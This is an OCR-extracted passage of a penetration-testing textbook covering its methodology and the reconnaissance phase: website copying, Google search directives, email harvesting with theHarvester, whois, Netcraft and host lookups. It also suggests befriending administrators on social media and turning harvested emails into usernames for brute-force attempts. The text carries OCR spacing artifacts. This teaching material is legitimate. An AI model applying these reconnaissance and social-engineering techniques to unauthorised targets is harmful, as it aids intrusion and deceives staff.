is important to cast our nets as wide as possible. ev ery detail and every piece of information about our target is collected and stored. th e penetration testing world is full of many great examples when a seemingly trivial piece of Reconnaissance Port Scanning Vulnerability Scanning Scanning Exploitation Maintaining Access fIGURE 1.3 Zero Entry Hacking Penetration (ZEH) Testing Methodology."},{"pageNumber":31,"pageContent":"The Basics of hacking and penetration T esting 12 information was collected in the initial phase and later turned out to be a cru- cial component for successfully completing an exploit and gaining access to the system. in later phases, we begin to drill down and focus on more specific details of the target. wh ere is the target located? wh at is the iP address? wh at operating system is the target running? wh at services and versions of software are running on the system? As you can see, each of these questions becomes increasingly more detailed and granular. i t is also important to understand the order of each step. t he order in which we conduct the steps is very important because the result or output of one step needs to be used in the step below it. You need to understand more than just how to simply run the security tools in this book. Understanding the proper sequence in which they are run is vital to performing a comprehensive and realistic penetration test. fo r example, many newcomers skip the re connaissance phase and go straight to exploiting their target. no t completing steps 1 and 2 will leave you with a significantly smaller target list and attack vector on each target. in other words, you become a one-trick-pony. Although knowing how to use a single tool might be impressive to your friends and family, it is not to the security commu- nity and professionals who take their job seriously. i t may also be helpful for newcomers to think of the steps we will cover as a circle. i t is very rare to find critical systems exposed directly to the i nternet in today’s world. i n many cases, penetration testers must access and penetrate a series of related targets before they have a path to reach the original target. i n these cases, each of the steps is often repeated. f igure 1.4 introduces the meth- odology as a cyclical process. f IGURE 1.4 Cyclical Representation of the ZEH Methodology."},{"pageNumber":32,"pageContent":"What Is penetration T esting? ChApTER 1 13 Zero Entry hacking: A four-Step Model let us briefly review each of the four steps that will be covered so you have a solid understanding of them. t he first step in any penetration test is “recon- naissance.” t his phase deals with information gathering about the target. As was mentioned previously, the more information you collect on your target, the more likely you are to succeed in later steps. reconnaissance will be dis- cussed in detail in chapter 2. re gardless of the information you had to begin with, after completing in- depth reconnaissance you should have a list of target iP addresses that can be scanned. th e second step in our methodology can be broken out into two dis- tinct activities. th e first activity we conduct is port scanning. on ce we have fin- ished with port scanning, we will have a list of open ports and potential service running on each of the targets. th e second activity in the scanning phase is vul- nerability scanning. Vulnerability scanning is the process of locating and iden- tifying specific weaknesses in the software and services of our targets. w ith the results from step 2 in hand, we continue to the “exploitation” phase. o nce we know exactly what ports are open, what services are running on those ports, and what vulnerabilities are associated with those services, we can begin to attack our target. t his is the phase that most newcomers associate with “real” hacking. e xploitation can involve lots of different techniques, tools, and code. we will review a few of the most common tools in c hapter 4. t he ulti- mate goal of exploitation is to have administrative access (complete control) over the target machine. t he final phase we will examine is “maintaining access.” o ftentimes, the payloads delivered in the exploitation phase provide us with only tempo- rary access to the system. Because most payloads are not persistent, we need to create a more permanent backdoor to the system. t his process allows our administrative access to survive program closures and even reboots. As an ethi- cal hacker, we must be very careful about the use and implementation of this phase. we will discuss how to complete this step as well as the ethical implica- tions of using backdoor or remote control software. Although not included as a formal step in the penetration testing methodol- ogy, the final (and arguably the most important) activity of every P t is the report. regardless of the amount of time and planning you put into conduct- ing the penetration test, the client will often judge your work and effectiveness on the basis of the quality of your report. t he final P t report should include all the relevant information uncovered in your test and explain in detail how the test was conducted and what was done during the test. w henever possible, mit- igations and solutions should be presented for the security issues you uncov- ered. f inally, an executive summary should be included in every P t report. t he purpose of this summary is to provide a simple one- to two-page, nontechni- cal overview of your findings. t his report should highlight and briefly sum- marize the most critical issues your test uncovered. i t is vital that this report"},{"pageNumber":33,"pageContent":"The Basics of hacking and penetration T esting 14 be readable (and comprehendible) by both technical and nontechnical person- nel. i t is important not to fill the executive summary with too many technical details; that is the purpose of the detailed report. ChApTER RE vIEW this chapter introduced the concept of penetration testing and hacking as a means of securing systems. i t also discussed the various roles and charac- ters that take part in the hacking scene. t he chapter examined the basics of Backtrack l inux including how to boot up, login, start x , get an i P address, and shutdown. we talked about how to set up your own isolated P t lab so you have a place to practice without fear of breaking the law and we wrapped up by reviewing the steps of a penetration test. it should be noted that there are several alternatives to Backtrack. At some point, you may want to review and explore these other distributions. ma triux is similar to Backtrack but also includes a wi ndows binary directory that can be used and accessed directly from a wi ndows machine. fe dora se curity sp in is a collection of security-related tools built off of the fe dora distribution. kAtAnA i s a multi-boot dVd that gathers a number of different tools and distributions into a single location. fi nally, you may want to explore the classic s td distri- bution as well as Pentoo and Blackbuntu. th ere are many other li nux pen- etration testing distributions—a simple go ogle search for “ li nux Penetration te sting di stributions” will provide you with a plethora of options. You could also spend some time building and customizing your own li nux distribution by collecting and installing tools as your hacking career progresses. SUMMAR y th is chapter introduced the concept of penetration testing and ethical hack- ing. A special “basics only,” four-step methodology including re connaissance, sc anning, ex ploitation, and ma intaining Access was presented and explained. in formation for setting up and using Backtrack li nux including configuring a network connection and issuing commands in a terminal window was pre- sented. th e use and creation of a penetration testing lab was outlined. th is will allow you to practice your skills in a safe and sandboxed environment. it will also allow for completing and following along with the examples detailed in this book."},{"pageNumber":34,"pageContent":"15 Reconnaissance ChApTER 2 Information in This Chapter: n HTT rack: Website Copier n Google Directives—Practicing Y our Google-Fu n The Har vester: Discovering and Leveraging E-mail Addresses n Whois n Netcraft n Host n Extracting Infor mation from DNS n Extracting Infor mation from E-mail Servers n MetaGooF il n Social Engineering n Sifting through the Intel to F inding Attackable Targets"},{"pageNumber":35,"pageContent":"The Basics of hacking and penetration T esting 16 INTRODUCTION in most cases people who attend hacking workshops or classes have a basic understanding of a few security tools. typically , these students have used a port scanner to examine a system or maybe they have used w ireshark to exam- ine network traffic. s ome have even played around with exploit tools like m etasploit. Unfortunately, most beginners do not understand how these tools fit into the grand scheme of a penetration test. As a result, their knowledge is incomplete. follo wing a methodology ensures that you have a plan and know what to do next. to stress the importance of using and following a methodology, it is often ben- eficial to describe a scenario that helps demonstrate both the importance of this step and the value of following a complete methodology when conducting a penetration test. Assume you are an ethical penetration tester working for a security company. Your boss walks over to your office and hands you a piece of paper. “I just got off the phone with the CEO of that company. He wants my best employee to Pen Test his company – that’s you. Our Legal Department will be sending you an email confirming we have all of the proper authorizations and insurance”. You nod, accepting the job. He leaves. You flip over the paper, a single word is written on the paper, “Syngress.” It’s a company you’ve never heard of before, and no other information is written on the paper. What now? t he first step in every job is research. t he more thoroughly you prepare for a task, the more likely you are to succeed. t he guys who created Backtrack l inux are fond of quoting Abraham l incoln who said, “ if i had six hours to chop down a tree, i ’d spend the first four of them sharpening my axe.” t his is a per- fect introduction to both penetration testing and the reconnaissance phase . Reconnaissance , also known as information gathering, is arguably the most important of the four phases we will discuss. t he more time you spend col- lecting information on your target, the more likely you are to be successful in the later phases. i ronically, recon is also one of the most overlooked, underuti- lized, and misunderstood steps in P t methodologies today. i t is possible that this phase is overlooked because newcomers are never for- mally introduced to the concept, its rewards, or how the results of good infor- mation gathering can be vital in later steps. i t is also possible that this phase is overlooked because it is the least “technical.” o ftentimes, people who are new to hacking tend to view this phase as boring and unchallenging. n othing could be further from the truth. Although it is true that there are very few good, automated tools that can be used to complete recon, once you understand the basics it is like an entirely new way of looking at the world. A good information gatherer is made up of equal parts: hacker, social engineer, and private investigator. Aside from the lack"},{"pageNumber":36,"pageContent":"Reconnaissance ChApTER 2 17 of tools, the absence of well-defined rules of engagement also distinguishes this phase from all others. th is is in stark contrast to the remaining steps in our methodology. fo r example, when we discuss scanning in ch apter 3, there is a specific order and a clear series of steps that need to be followed in order to properly port scan a target. l earning how to conduct digital reconnaissance is a valuable skill for anyone living in today’s world. for penetration testers and hackers, it is invaluable. t he penetration testing world is filled with great examples and stories of how good recon single-handedly allowed the tester to fully compromise a network or system. c onsider the following example: assume we have two different criminals who are planning to rob a bank. t he first criminal buys a gun and runs into the first bank he finds yelling “HA nds UP! gi Ve me A ll Y o Ur mone Y!” i t is not hard to imagine that the scene would be complete chaos and even if the bungling burglar managed to get away, it probably would not take long for the police to find him, arrest him, and send him to prison. c ontrast this to nearly every Hollywood movie in existence today where criminals spend months planning, scheming, organizing, and reviewing details before the heist. t hey spend time getting weapons anonymously, planning escape routes, and review- ing schematics of the building. t hey visit the bank to determine the position of the security cameras, make note of the guards, and determine when the bank has the most money or is the most vulnerable. c learly, the second criminal has the better chance of getting away with the money. i t should be obvious that the difference between these two examples is prepa- ration and homework. Hacking and penetration testing is the same—you can- not just get an i P address and start running m etasploit (well you can, but you are probably not going to be very effective). recall the example used to begin this chapter. You had been assigned to complete a penetration test but were given very little information to go on. As a matter of fact, you were given only the company name, one word. t he million-dollar question for every aspiring hacker is, “How do i go from a single company name to owning the systems inside the network?” w hen we begin, we know virtually nothing about the organization; we do not know their web- site, physical address, or number of employees. we do not know their public i P addresses or internal i P schemes; we know nothing about the technology deployed, operating systems used, or defenses. st ep 1 begins by conducting a thorough search of public information. th e great thing about this phase is that in most cases, we can gather a significant amount of data without ever sending a single packet to the target. Although it should be pointed out that some tools or techniques used in reconnaissance do in fact send information directly to the target, it is important to know the difference between which tools do and which tools do not touch the target. th ere are two main goals in this phase: first, we need to gather as much information as pos- sible about the target; second, we need to sort through all the information gath- ered and create a list of attackable iP addresses."},{"pageNumber":37,"pageContent":"The Basics of hacking and penetration T esting 18 in ch apter 1, it was pointed out that a major difference between black hat and white hat attackers is authorization. st ep 1 provides us with a prime example of this. Both types of hackers conduct exhaustive reconnaissance on their targets. Unfortunately, malicious hackers are bound by neither scope nor authorization. wh en ethical hackers conduct research, they are required to stay within the confines of the test. du ring the information gathering process, it is not unheard-of for a hacker to uncover a vulnerable system that is related to the tar- get but not owned by the target. ev en if the related target could provide access into the original organization, without prior authorization, a white hat hacker is not allowed to use or explore this option. fo r example, let us assume that you are doing a penetration test against a company and you determine that their web server (which contains customer records) is outsourced or managed by a third party. if you find a serious vulnerability on the customer’s website, but you have not been explicitly authorized to test and use the website, you must ignore it. th e black hat attackers are bound by no such rules and will use any means possible to access the target systems. in most cases, because you were not authorized to test and examine these outside systems, you will not be able to provide a lot of detail; however, your final report must include as much information as possible about any systems that you believe put the organiza- tion at risk. to be successful at reconnaissance, you must have a strategy. n early all facets of information gathering leverage the power of the i nternet. A typical strategy needs to include both active and passive reconnaissance. Active reconnaissance includes interacting directly with the target. i t is important to note that during this process, the target may record our i P address and log our activity. Passive reconnaissance makes use of the vast amount of information available on the web. w hen we are conducting passive reconnaissance, we are not inter- acting directly with the target and as such, the target has no way of knowing, recording, or logging our activity. As mentioned, the goal of reconnaissance is to collect as much information as possible on your target. At this point in the penetration test, no detail should be overlooked regardless of how innocuous it may seem. w hile you are gath- ering information, it is important to keep your data in a central location. w henever possible, it is helpful to keep the information in electronic format. t his allows for quick and accurate searches later on. e very hacker is a bit dif- ferent and there are still several hackers who prefer to print out all the infor- mation they gather. e ach piece of paper is carefully cataloged and stored in a folder. i f you are going to use the traditional paper method, be sure to carefully organize your records. Paper-based information gathering binders on a single target can quickly grow to several hundred pages. i n most cases, the first activity is to locate the target’s website. i n our example, we would use a search engine to look for “ syngress.”"},{"pageNumber":38,"pageContent":"Reconnaissance C h A p TER 2 19 h TT rack : W EBSITE C O p IER t ypically, we begin step 1 by closely reviewing the target’s website. i n some cases, we may actually use a tool called H tt ra ck to make a page-by-page copy of the website. H tt ra ck is a free utility that creates an identical, off-line copy of the target website. t he copied website will include all the pages, links, pic- tures, and code from the original website; however, it will reside on your local f IGURE 2.1 Accessing the Newly Installed HTTrack. A DDITIONAL R ESOURCES It is important to understand that the more time you spend navigating and exploring the target website, the more likely it is that your activity can be tracked or traced (even if you are simply browsing the site). Remember anytime you interact directly with a resource owned by the target, there is a chance you will leave a digital fingerprint behind. Advanced penetration testers can also run automated tools to extract additional or hidden information from a local copy of a website. HTTrack can be downloaded directly from the company’s website at: http://www. httrack.com/. Installing for Windows is as simple as downloading the installer .exe and clicking next. If you want to install HTTrack in Backtrack, you can connect to the Internet as we described in Chapter 1, open a terminal, and type: apt-get install webhttrack Once the program is installed in, you can find it by clicking: Kstart → Internet → WebHTTrack Website Copier, as shown in Figure 2.1. The “Kstart” is the small dragon icon in the lower left of the screen. This provides you access to many of the tools included with Backtrack. The Kstart button is similar to the Windows or Start button found in many Microsoft operating systems. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":39,"pageContent":"The Basics of hacking and penetration T esting 20 computer. Utilizing a website copying tool like H t tr ack allows us to explore and thoroughly mine the website “off-line” without having to spend additional time traipsing around on the company’s web server. After we have installed the program, we need to run it against our target. Please be aware that this activity is easy to trace and considered highly offensive. ne ver run this tool without prior authorization. on ce H t tr ack is started, we are pre- sented with a number of web pages that allow us to set up and customize the copy process. ea ch page allows us to change various aspects of the program including language ( en glish is default), project name, the location where we will store the copied website, and the web address of the site you would like to copy. You can work your way through each of these pages by making the desired changes to each option and clicking the “ ne xt” button. th e final page will include a “ st art” button, click this when you are ready to begin making a copy of your target’s website. th e amount of time it takes for this process to complete will depend on the size of your target’s website. on ce H t t r ack has finished copying the target website, it will present you with a webpage allow- ing you to “Browse the mi rrored we bsite” in a browser or navigate to the path where the site was stored. w hether you make a copy of the target website or you simply browse the tar- get in real time, it is important to pay attention to details. You should begin by closely reviewing and recording all the information you find on the target’s website. o ftentimes, with very little digging you will be able to make some sig- nificant findings including physical address and locations, phone numbers, e-mail addresses, hours of operation, business relationships (partnerships), employee names, social media connections, and other public tidbits. o ftentimes when conducting a penetration test, it is important to pay spe- cial attention to things like “ news” or “Announcements.” c ompanies are often proud of their achievements and unintentionally leak useful informa- tion through these stories. c ompany mergers and acquisitions can also yield valuable data; this is especially important for expanding the scope and adding additional targets to our penetration test. e ven the smoothest of acquisitions creates change and disarray in an organization. t here is always a transition period when companies merge. t his transition period provides us with unique opportunities to take advantage of the change and confusion. e ven if merger is old news or goes off without a hitch, the information still provides value by giving us additional targets. m erged or sibling companies should be authorized and included in the original target list, as they provide a potential gateway into the organization. f inally, it is important to search and review any open job postings for the tar- get company. Job postings often reveal very detailed information about the technology being used by an organization. m any times you will find specific hardware and software listed on the job opening. d o not forget to search for your target in the nationwide job banks as well. for example, assume you come across a job requisition looking for a n etwork Administrator with c isco"},{"pageNumber":40,"pageContent":"Reconnaissance ChApTER 2 21 AsA experience. f rom this post, you can draw some immediate conclusions and make some educated guesses. f irst, you can be certain that the company either uses, or is about to use, a c isco A sA firewall. s econd, depending on the size of the organization, you may be able to infer that the company does not have, or is about to lose, someone with knowledge of how to properly use and configure a c isco A sA firewall. i n either case, you have gained valuable knowl- edge about the technology in place. i n most cases, once we have thoroughly examined the target’s website, we should have a solid understanding of the target including who they are, what they do, and where they are located. Armed with this basic information about the target, we move into passive reconnaissance. i t is very difficult, if not impossible, for a company to deter- mine when a hacker or penetration tester is conducting passive reconnaissance. t his activity offers a low-risk, high-reward situation for attackers. recall that passive reconnaissance is conducted without ever sending a single packet to the target systems. o ur weapon of choice to perform this task is the i nternet. we begin by performing exhaustive searches of our target in the various search engines available. Although there are many great search engines available today, when covering the basics of hacking and penetration testing, we will focus on g oogle. g oogle is very, very good at its job. t here is a reason why the company’s stock trades for $400  $600 a share. s piders from the company aggressively and repeatedly scour all corners of the i nternet cataloging information and send it back to the g oogle. t he company is so efficient at its job, that oftentimes hackers can per- form an entire penetration test using nothing but google. At d efcon 13 Johnny l ong rocked the hacker community by giving a talk titled “google Hacking for Penetration testers .” t his talk was followed up by a book that dove even deeper into the art of google Hacking. Although we would not dive into the specifics of g oogle Hacking, a solid understanding of how to properly use g oogle is vital to becoming a skilled penetration tester. i f you ask people, “How do you use g oogle?” they typically respond by saying, “ w ell it’s simple ... You fire up a web browser, navigate to g oogle, and type what you’re searching for in the box.” ADDITIONAL RESOURCES If you are interested in penetration testing, it is highly suggested that you watch the video and buy the book. You can see the video for free online (check the Defcon media archive), and the book is published by Syngress and available nearly anywhere. Johnny’s discoveries have changed penetration testing and security forever. Johnny’s material is awesome and well worth your time."},{"pageNumber":41,"pageContent":"The Basics of hacking and penetration T esting 22 Although this answer is fine for 99 percent of the planet, it is not good enough for aspiring hackers. You have to learn to search in a smarter way and maxi- mize the return results. i n short, you must cultivate your g oogle-fu. l earning how to properly use a search engine like g oogle will save you time and allow you to find the hidden gems that are buried in the trillions of web pages on the i nternet today. GOOGLE DIRECTI vES—p RACTICING yOUR GOOGLE -fU luckily for us, g oogle provides “directives” that are easy to use and help us get the most out of every search. t hese directives are keywords that enable us to more accurately extract information from the google index. c onsider the following example: assume you are looking for information on the d akota s tate University website (dsu.edu) about me. t he simplest way to perform this search is to enter the following terms (without the quotes) in a g oogle search box: “pat engebretson dsu.” t his search will yield a fair number of hits. However of the first 50 websites returned, only four were pulled directly from the dsU website. By utilizing go ogle directives, we can force the go ogle in dex to do our bid- ding. in the example above we know both the target website and the keywords we want to search. mo re specifically, we are interested in forcing go ogle to return only results that are pulled directly from the target (dsu.edu) domain. in t his case, our best choice is to utilize the “site:” directive. Using the “site:” direc- tive forces go ogle to return only hits that contain the keywords we used and come directly from the specified website. to properly use a google directive, you need three things: 1. t he name of the directive you want to use 2. A colon 3. t he term you want to use in the directive After you have entered the three pieces of information above, you can search as you normally would. to utilize the “site:” directive, we need to enter the fol- lowing into a google search box: site:domain term(s) to search note that there is no space between the directive, colon, and domain. i n our earlier example we wanted to conduct a search for Pat e ngebretson on the ds U website. to accomplish this, we would enter the following command into the g oogle search bar: site:dsu.edu pat engebretson running this search provides us with drastically different results than our ini- tial attempt. f irst, we have trimmed the overall number of hits from 600 "},{"pageNumber":42,"pageContent":"Reconnaissance ChApTER 2 23 to about 50. t here is little doubt that a person can sort through and gather information from 50 hits much quicker than 600. s econd and possibly more importantly, every single returned result comes directly from the target website. Utilizing the “site:” directive is a great way to search a specific target and look for additional information. t his directive allows you to avoid search overload and to focus your search. Another good g oogle directive to use is “intitle:” or “allintitle:”. Adding either of these to your search causes only websites that have your search words in the title of the webpage to be returned. t he difference between “intitle:” and “allin- title:” is straightforward. “allintitle:” will only return websites that contain all the keywords in the web page title. t he “intitle:” directive will return any page whose title contains at least one of the keywords you entered. A classic example of putting the “allintitle:” g oogle hack to work is to perform the following search: allintitle:index of Performing this search will allow us to view a list of any directories that have been indexed and are available via the web server. t his is often a great place to gather reconnaissance on your target. i f we want to search for sites that contain specific words in the U rl, we can use the “inurl:” directive. for example, we can issue the following command to locate potentially interesting pages on our target’s web page: inurl:admin this search can be extremely useful in revealing administrative or configuration pages on y our target’s website. i t can also be very valuable to search the g oogle cache rather than the target’s website. t his process not only reduces your digital footprints on the target’s server, making it harder to catch you, it also provides a hacker with the occa- sional opportunity to view web pages and files that have been removed from the original website. t he g oogle cache contains a stripped-down copy of each website that the g oogle bots have spidered. i t is important to understand that the cache contains both the code used to build the site and many of the files that were discovered during the spidering process. t hese files can be P dfs, ms o ffice documents like word and excel, text files, and more. i t is not uncommon today for information to be placed on the i nternet by mistake. c onsider the following example. s uppose you are a network ALERT ! It is worth noting that all searches in Google are case insensitive so “pat,” “Pat,” and “PAT” will all return the same results!"},{"pageNumber":43,"pageContent":"The Basics of hacking and penetration T esting 24 administrator for a company. You use ms e xcel to create a simple workbook containing all the i P addresses, computer names, and locations of the P cs in your network. rather than carrying this e xcel spreadsheet around, you decide to publish it to the intranet where it will be accessible only by people within your organization. However, rather than publishing this document to the intranet website, you mistakenly publish it to the company i nternet website. i f the g oogle bots spider your site before you take this file down, it is possible the document will live on in the g oogle cache even after you have removed it from your site. As a result, it is important to search the google cache too. we can use the cache: directive to limit our search results and show only infor- mation pulled directly from the g oogle cache. t he following search will pro- vide us with the cached version of the syngress homepage: cache:syngress.com it is important that you understand that clicking on any of the U rls will bring y ou to the live website, not the cached version. i f you want to view specific cached pages, you will need to modify your search. t he last directive we will cover here is “filetype:”. we can utilize “filetype:” to search for specific file extensions. t his is extremely useful for finding specific types of files on your target’s website. for example, to return only hits that con- tain Pdf documents, you would issue the following command: filetype:pdf this powerful directive is a great way to find links to specific files like .doc, xlsx, ppt, txt, and man y more. Your options are nearly limitless. for additional power, we can combine multiple directives into the same search. for example, if we want to find all the PowerPoint presentations on the ds U website, you would enter the following command into the search box: site:dsu.edu filetype:ppt in this case, every result that is returned is a PP t file and comes directly from the dsu.edu domain! f igure 2.2 shows a screenshot of two searches: the first f IGURE 2.2 The Power of Google Directives."},{"pageNumber":44,"pageContent":"Reconnaissance ChApTER 2 25 utilizes g oogle directives and the second shows the results from a traditional search. Utilizing g oogle directives has drastically reduced the number of hits (by 33,364!). t here are many other types of directives and g oogle hacks that you should become familiar with. Along with g oogle, it is important that you become efficient with several other search engines as well. o ftentimes, different search engines will provide different results, even when you search for the same key- words. As a penetration tester conducting reconnaissance, you want to be as thorough as possible. As a final warning, it should be pointed out that these passive searches are only passive as long as you are searching. o nce you make a connection with the target system (by clicking on any of the links), you are back to active mode. Be aware that active reconnaissance without prior authorization is likely an illegal activity. on ce you have thoroughly reviewed the target’s web page and conducted exhaustive searches utilizing go ogle and other search engines, it is important to explore other corners of the in ternet. ne wsgroups and Bulletin Board sy stems like Use ne t and go ogle gr oups can be very useful for gathering information about a target. it is not uncommon for people to use these discussion boards to post and receive help with technical issues. Unfortunately (or fortunately, depending on which side of the coin you are looking at), employees often post very detailed questions including sensitive and confidential information. fo r example, consider a network administrator who is having trouble getting his firewall properly configured. it is not uncommon to witness discussions on public forums where these admins will post entire sections of their config files. to make matters worse, many people post using their company e-mail addresses. th is information is a virtual gold mine for an attacker. e ven if our network admin is smart enough not to post detailed configuration files, it is hard to get support from the community without inadvertently leak- ing some information. reading even carefully scrubbed posts will often reveal specific software version, hardware models, current configuration information, and the like about internal systems. All this information should be filed away for future use. Public forums are an excellent way to share information and receive technical help. However, when using these resources, be careful to use a slightly more anonymous e-mail address like g mail or Hotmail, rather than your corporate address. t he explosive growth in social media like facebook, m yspace, and twitter pro- vides us with new avenues to mine data about our targets. w hen performing reconnaissance, it is a good idea to use these sites to our advantage. c onsider the following fictitious example: You are conducting a penetration test against a small company. Your reconnaissance has led you to discover that the network administrator for the company has a twitter and facebook account. Utilizing a"},{"pageNumber":45,"pageContent":"The Basics of hacking and penetration T esting 26 little social engineering you befriend the unsuspecting admin and follow him on both facebook and twitter . After a few weeks of boring posts, you strike the jackpot. He makes a post on facebook that says “ great. f irewalled died with- out warning today. n ew one being sent over-night. l ooks like i ’ll be pulling an all-nighter tomorrow to get things back to normal.” Another example would be a P c tech who posts, “Problem with latest m icrosoft patch, had to uninstall. will call ms in the morning.” o r even the following, “Just finished the annual budget process. l ooks like i ’m stuck with that server 2000 for another year.” Although these examples may seem a bit over the top, you will be surprised at the amount of information you can collect by simply monitoring what employees post online. Th E hAR v ESTER : DISCO v ERING AND LE vERAGING E-MAIL ADDRESSES An excellent tool to use in reconnaissance is t he Harvester. t he Harvester is a simple but highly effective Python script written by c hristian m artorella at e dge s ecurity. t his tool allows us to quickly and accurately catalog both e-mail addresses and subdomains that are directly related to our target. i t is important to always use the latest version of the Harvester as many search engines regularly update and change their systems. e ven subtle changes to a search engine’s behavior can render automated tools ineffective. i n some cases, search engines will actually filter the results before returning information to you. m any search engines also employ throttling techniques that will attempt to prevent you from running automated searches. th e Harvester can be used to search go ogle, Bing, and P gP servers for e-mails, hosts, and subdomains. it can also search li nked in for user names. mo st peo- ple assume their e-mail address is benign. we have already discussed the dan- gers of posting to public forums using your corporate e-mail address; however, there are additional hazards you should be aware of. le t us assume during your reconnaissance you discover the e-mail address of an employee from your tar- get organization. By twisting and manipulating the information before the “@” symbol, we should be able to create a series of potential network usernames. it is not uncommon for organizations to use the exact same user names and e-mail addresses (before the “@” symbol). wi th a handful of prospective user- names, we can attempt to brute force our way into any services, like s sH , VP ns , or f tP , that we (will) discover during the next step 2 (scanning). t he Harvester is built into Backtrack. to access the Harvester, use the following steps: 1. c lick on the kstart dragon, located in the lower left corner of your screen. 2. Highlight “Backtrack” at the top of the menu."},{"pageNumber":46,"pageContent":"Reconnaissance ChApTER 2 27 3. Highlight “ information gathering.” 4. Highlight “ All.” 5. s elect “theHarvester” (note, tools are listed in alphabetical order). You can also open a terminal window and navigate to the Harvester directory by issuing the following command: cd /pentest/enumeration/google/theharvester regardless of whether you have downloaded the Harvester or used the ver- sion installed in Backtrack, we will use it to collect additional information about our target. Be sure you are in theHarvester folder and run the following command: ./theHarvester.py –d syngress.com –l 10 –b google this command will search for e-mails, subdomains, and hosts that belong to s yngress.com. figure 2.3 shows our results. Before discussing the results of our tool, let us examine the command a little closer. “ ./theHarvester.py ” is used to invoke the tool. A lowercase “ –d ” is used to specify the target domain. A lowercase “ –l ” (that is an l not a 1) is used to limit the number of results returned to us. i n this case, the tool was instructed to return only 10 results. t he “ –b “ is used to specify what public repository we want to search. we can choose among g oogle, Bing, P gP, or l inkedin—for this example, we chose to search using google. n ow that you fully understand the command that was run, let us take a look at the results. As you can see, the Harvester was effective in locating at least two e-mail addresses that could be of value to us. Please note, the e-mail addresses in the screenshot have been circled and obfuscated. th e Harvester was also successful ADDITIONAL RESOURCES If you are using an operating system other than Backtrack, you can download the tool directly from Edge Security at: http://www.edge-security.com. Once you have got it downloaded, you can unpack the downloaded tar file by running the following command in a terminal: tar xf theHarvester Please note the capital “H” that is used when untarring the code. Linux is case sensitive, so the operating system sees a difference between “theHarvester” and “theharvester.” You will need to pay attention to the executable to determine if you should use a capital or lowercase “h.” If the cases do not match exactly, you will typically get a message saying “no such file or directory.” This is a good indication that you have mistyped the name of the file."},{"pageNumber":47,"pageContent":"The Basics of hacking and penetration T esting 28 in finding at least two additional subdomains. Both “booksite.syngress.com” and “ebook__www.syngress.com” need to be fully recon’d. we simply add these new domains to our target list and begin the reconnaissance process again. s tep 1 of reconnaissance is very cyclical because in-depth reconnaissance often leads to the discovery of new targets, which, in turn, leads to additional recon- naissance. As a result, the amount of time to complete this phase will vary from several hours to several weeks. remember , a determined malicious hacker understands not only the power of good reconnaissance but also that of a nearly limitless amount of time. As an aspiring penetration tester, you should devote as much time as possible to practicing and conducting information gathering. Wh OIS A very simple but effective means for collecting additional information about our target is w hois. t he w hois service allows us to access specific information about our target including the i P addresses or host names of the company’s d omain n ame s ystems ( dns) servers and contact information usually con- taining an address and phone number. w hois is built into the l inux operating system. t he simplest way to use this service is to open a terminal and enter the following command: whois target_domain f IGURE 2.3 Output of the Harvester."},{"pageNumber":48,"pageContent":"Reconnaissance ChApTER 2 29 for example, to find out information about s yngress, we would issue the fol- lowing command: “whois syngress.com.” f igure 2.4 shows a partial output from the result of this tool. i t is important to record all the information and pay special attention to the dns servers. i f the dns servers are listed by name only, as shown in f igure 2.4, we will use the Host command to translate those names into i P addresses. we will discuss the host command in the next section. You can also use a web browser to search w hois. By navigating to http://www.whois.net, you can search for your target in the “ wHois lookup” box as shown in figure 2.5. Again it is important to closely review the information you are presented with. s ometimes, the output will not provide many details. we can often access these additional details by querying the specific whois server listed in the out- put of our original search. figure 2.6 shows an example of this. f IGURE 2.4 Partial Output from a Whois Query. f IGURE 2.5 Whois.net—A Web-Based Lookup Tool."},{"pageNumber":49,"pageContent":"The Basics of hacking and penetration T esting 30 we can conduct a further whois search by following the link provided in the “referral Url:” field. You may have to search the webpage for a link to their w hois service. By using s afename’s whois service, we can extract a significantly larger amount of information as shown here: The Registry database contains ONLY .COM, .NET, .EDU domains and Registrars.[whois.safenames.net] Safenames Whois Server Version 2.0 Domain Name: SYNGRESS.COM [REGISTRANT] Organisation Name: Elsevier Ltd Contact Name: Domain Manager Address Line 1: The Boulevard Address Line 2: Langford Lane, Kidlington City/Town: Oxfordshire State/Province: Zip/Postcode: OX5 1GB Country: UK Telephone:  44 (18658) 43830 Fax:  44 (18658) 53333 Email: domainsupport@elsevier.com [ADMIN] Organisation Name: Safenames Ltd Contact Name: International Domain Administrator Address Line 1: PO Box 5085 Address Line 2: City/Town: Milton Keynes MLO State/Province: Bucks Zip/Postcode: MK6 3ZE Country: UK Telephone:  44 (19082) 00022 Fax:  44 (19083) 25192 Email: hostmaster@safenames.net f IGURE 2.6 Whois Output Showing Where to Go for Additional Details."},{"pageNumber":50,"pageContent":"Reconnaissance ChApTER 2 31 [TECHNICAL] Organisation Name: International Domain Tech Contact Name: International Domain Tech Address Line 1: PO Box 5085 Address Line 2: City/Town: Milton Keynes MLO State/Province: Bucks Zip/Postcode: MK6 3ZE Country: UK Telephone:  44 (19082) 00022 Fax:  44 (19083) 25192 Email: tec@safenames.net NETCRA fT Another great source of information is n etcraft. You can visit their site at http://news.netcraft.com. s tart by searching for your target in the “ what’s that site running?” textbox as sho wn in figure 2.7. n etcraft will return any websites it is aware of that contain your search words. i n our example we are presented with three sites: syngress.com, www.syngress. com, and booksite.syngress.com. i f any of these sites have escaped our previous searches, it is important to add them to our potential target list. t he returned results page will allow us to click on a “ site report.” Viewing the site report should provide us with some valuable information as shown in figure 2.8. As you can see, the site report provides us with some great information about our target including the i P address and os of the web server as well as the dns server. once again all this information should be cataloged and recorded. hOST oftentimes, our reconnaissance efforts will result in host names rather than i P addresses. w hen this occurs, we can use the “host” tool to perform a transla- tion for us. t he host tool is built into Backtrack. we can access it by opening a terminal and typing: root@bt~# host target_hostname f IGURE 2.7 Netcraft Search Option."},{"pageNumber":51,"pageContent":"The Basics of h acking and p enetration Testing 32 i n our previous searches, we uncovered a dns server with the host name “ns1. dreamhost.com.” t o translate this into an i P address, we would enter the fol- lowing command in a terminal: host ns1.dreamhost.com f igure 2.9 shows the result of this tool. t he host command can also be used in reverse. i t can be used to translate i P addresses into host names . t o perform this task, simply enter: root@bt~# host IP address Using the “ -a ” switch will provide you with verbose output and possibly reveal additional information about your target. i t is well worth your time to review the “host” documentation and help files. You can do so by issuing the “man host” command in a terminal window. t his help file will allow you to become familiar with the various options that can be used to provide additional func- tionality to the “host” tool. E XTRACTING IN f ORMATION f ROM DNS dns servers are an excellent target for hackers and penetration testers. t hey usually contain information that is considered highly valuable to attackers. dns is a core component of both our local networks and the i nternet. Among f IGURE 2.9 Host Command Output. f 